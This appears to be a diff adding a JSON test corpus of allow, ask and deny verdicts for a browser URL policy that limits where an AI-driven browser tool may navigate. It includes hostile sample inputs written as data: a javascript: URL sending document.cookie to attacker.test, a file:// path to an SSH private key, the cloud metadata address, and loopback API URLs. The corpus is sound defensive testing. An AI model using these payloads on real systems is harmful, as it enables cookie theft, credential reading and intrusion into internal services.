@@ -1,0 +1,83 @@
+{
+  "comment": "Shared conformance corpus for the browser URL policy. Both source/Private/Resolve-DpBrowserUrlDecision.ps1 and source/browser/policy.mjs are held to identical verdicts on every case, because one boundary enforced in two places is only a boundary while the two agree.",
+  "scope": ["weathercity.com", "example.test"],
+  "urlCases": [
+    { "url": "https://weathercity.com/", "expect": "allow", "note": "the scoped host itself" },
+    { "url": "https://weathercity.com/cl/ll/osorno", "expect": "allow", "note": "the workflow's target page" },
+    { "url": "https://www.weathercity.com/cl/", "expect": "allow", "note": "subdomain of a scoped host" },
+    { "url": "https://a.b.c.weathercity.com/", "expect": "allow", "note": "deep subdomain" },
+    { "url": "https://WeatherCity.COM/cl/", "expect": "allow", "note": "host case is normalised" },
+    { "url": "https://weathercity.com./", "expect": "allow", "note": "trailing root dot is normalised" },
+    { "url": "https://weathercity.com:8443/cl/", "expect": "allow", "note": "a non-default port on a scoped host is still that host" },
+    { "url": "https://example.test/page", "expect": "allow", "note": "a project-added host" },
+
+    { "url": "https://evilweathercity.com/", "expect": "ask", "note": "suffix confusion: must not inherit scope" },
+    { "url": "https://notweathercity.com/", "expect": "ask", "note": "suffix confusion" },
+    { "url": "https://weathercity.com.evil.test/", "expect": "ask", "note": "scoped name used as a label prefix" },
+    { "url": "https://weathercity.competitor.test/", "expect": "ask", "note": "scoped name as a bare label" },
+    { "url": "https://xn--80ak6aa92e.com/", "expect": "ask", "note": "punycode homograph is a different host" },
+    { "url": "https://attacker.test/?ctx=D%3A%5CGit%5CDeskPilot", "expect": "ask", "note": "the exfiltration case the card exists to show" },
+    { "url": "https://sub.example.test.attacker.test/", "expect": "ask", "note": "project host used as a prefix" },
+
+    { "url": "", "expect": "deny", "note": "empty" },
+    { "url": "   ", "expect": "deny", "note": "whitespace only" },
+    { "url": "not a url", "expect": "deny", "note": "unparseable" },
+    { "url": "https://", "expect": "deny", "note": "scheme with no host" },
+    { "url": "//weathercity.com/", "expect": "deny", "note": "protocol-relative is not absolute" },
+
+    { "url": "http://weathercity.com/", "expect": "deny", "note": "plain http is rewritable in transit" },
+    { "url": "file:///C:/Users/install/.ssh/id_rsa", "expect": "deny", "note": "reads the disk the browser exists not to reach" },
+    { "url": "file://server/share/secret.txt", "expect": "deny", "note": "UNC read" },
+    { "url": "javascript:fetch('https://attacker.test/?c='+document.cookie)", "expect": "deny", "note": "executes attacker text with page authority" },
+    { "url": "data:text/html,<script>location='https://attacker.test'</script>", "expect": "deny", "note": "no host to scope" },
+    { "url": "blob:https://weathercity.com/1234", "expect": "deny", "note": "no host to scope" },
+    { "url": "view-source:https://weathercity.com/", "expect": "deny", "note": "no host to scope" },
+    { "url": "ftp://weathercity.com/pub", "expect": "deny", "note": "not https" },
+    { "url": "ws://weathercity.com/socket", "expect": "deny", "note": "not https" },
+    { "url": "wss://weathercity.com/socket", "expect": "deny", "note": "a socket is not a navigation" },
+    { "url": "chrome://settings", "expect": "deny", "note": "browser internals" },
+    { "url": "about:blank", "expect": "deny", "note": "not https" },
+
+    { "url": "https://user:secret@weathercity.com/", "expect": "deny", "note": "credential in a Model-chosen string" },
+    { "url": "https://user@weathercity.com/", "expect": "deny", "note": "userinfo without a password is still userinfo" },
+
+    { "url": "https://127.0.0.1:8720/api/settings", "expect": "deny", "note": "DeskPilot's own API is on loopback" },
+    { "url": "https://localhost:8720/api/settings", "expect": "deny", "note": "single-label host" },
+    { "url": "https://[::1]:8720/api/settings", "expect": "deny", "note": "IPv6 loopback" },
+    { "url": "https://10.0.0.5/admin", "expect": "deny", "note": "RFC1918" },
+    { "url": "https://192.168.1.1/admin", "expect": "deny", "note": "RFC1918" },
+    { "url": "https://172.16.0.1/admin", "expect": "deny", "note": "RFC1918" },
+    { "url": "https://169.254.169.254/latest/meta-data/", "expect": "deny", "note": "cloud metadata service" },
+    { "url": "https://0.0.0.0/", "expect": "deny", "note": "unspecified address" },
+    { "url": "https://[fd00::1]/", "expect": "deny", "note": "IPv6 unique local" },
+    { "url": "https://[fe80::1]/", "expect": "deny", "note": "IPv6 link local" },
+    { "url": "https://93.184.216.34/", "expect": "deny", "note": "even a public IP literal evades a name-based allow-list" },
+    { "url": "https://intranet/", "expect": "deny", "note": "single-label host resolves through search domains" },
+    { "url": "https://printer.local/", "expect": "deny", "note": "mDNS" },
+    { "url": "https://host.localhost/", "expect": "deny", "note": "loopback alias" }
+  ],
+  "resourceCases": [
+    { "url": "https://weathercity.com/app.js", "type": "script", "expect": true, "note": "in scope, any type" },
+    { "url": "https://weathercity.com/api", "type": "xhr", "expect": true, "note": "in scope, any type" },
+    { "url": "https://weathercity.com/socket", "type": "websocket", "expect": true, "note": "in scope, any type" },
+
+    { "url": "https://cdn.attacker.test/logo.png", "type": "image", "expect": true, "note": "passive, page-controlled, leaks nothing" },
+    { "url": "https://cdn.attacker.test/site.css", "type": "stylesheet", "expect": true, "note": "passive" },
+    { "url": "https://cdn.attacker.test/font.woff2", "type": "font", "expect": true, "note": "passive" },
+    { "url": "https://cdn.attacker.test/clip.mp4", "type": "media", "expect": true, "note": "passive" },
+
+    { "url": "https://attacker.test/tracker.js", "type": "script", "expect": false, "note": "rewrites the page after approval" },
+    { "url": "https://attacker.test/collect", "type": "xhr", "expect": false, "note": "channel outside the navigation record" },
+    { "url": "https://attacker.test/collect", "type": "fetch", "expect": false, "note": "channel outside the navigation record" },
+    { "url": "https://attacker.test/socket", "type": "websocket", "expect": false, "note": "outlives the tool call" },
+    { "url": "https://attacker.test/stream", "type": "eventsource", "expect": false, "note": "outlives the tool call" },
+    { "url": "https://attacker.test/app.webmanifest", "type": "manifest", "expect": false, "note": "not passive" },
+    { "url": "https://attacker.test/frame", "type": "document", "expect": false, "note": "a navigation wearing a sub-resource's clothes" },
+    { "url": "https://attacker.test/thing", "type": "quantum", "expect": false, "note": "an unrecognised type cannot be reasoned about" },
+    { "url": "https://attacker.test/thing", "type": "", "expect": false, "note": "a missing type is not passive" },
+
+    { "url": "file:///C:/secret.png", "type": "image", "expect": false, "note": "refused scheme beats passive type" },
+    { "url": "https://127.0.0.1:8720/api/settings", "type": "image", "expect": false, "note": "loopback beats passive type" },
+    { "url": "https://169.254.169.254/latest/meta-data/", "type": "image", "expect": false, "note": "metadata service beats passive type" }
+  ]
+}
